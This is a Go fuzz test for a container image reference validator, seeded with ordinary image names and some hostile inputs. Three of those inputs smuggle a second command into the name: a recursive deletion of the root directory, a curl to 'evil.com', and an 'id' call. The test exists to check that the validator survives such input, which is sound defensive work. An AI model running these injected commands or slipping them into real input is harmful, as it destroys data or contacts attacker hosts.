package api

import (
	"testing"
)

func FuzzValidateImageReference(f *testing.F) {
	f.Add("alpine:latest")
	f.Add("docker.io/library/nginx:1.25")
	f.Add("ghcr.io/owner/repo@sha256:abcdef1234567890")
	f.Add("")
	f.Add("alpine; rm -rf /")
	f.Add("alpine$(curl evil.com)")
	f.Add("alpine`id`")
	f.Add(string(make([]byte, 1024)))

	f.Fuzz(func(t *testing.T, imageRef string) {
		// Should never panic, regardless of input
		_ = validateImageReference(imageRef)
	})
}
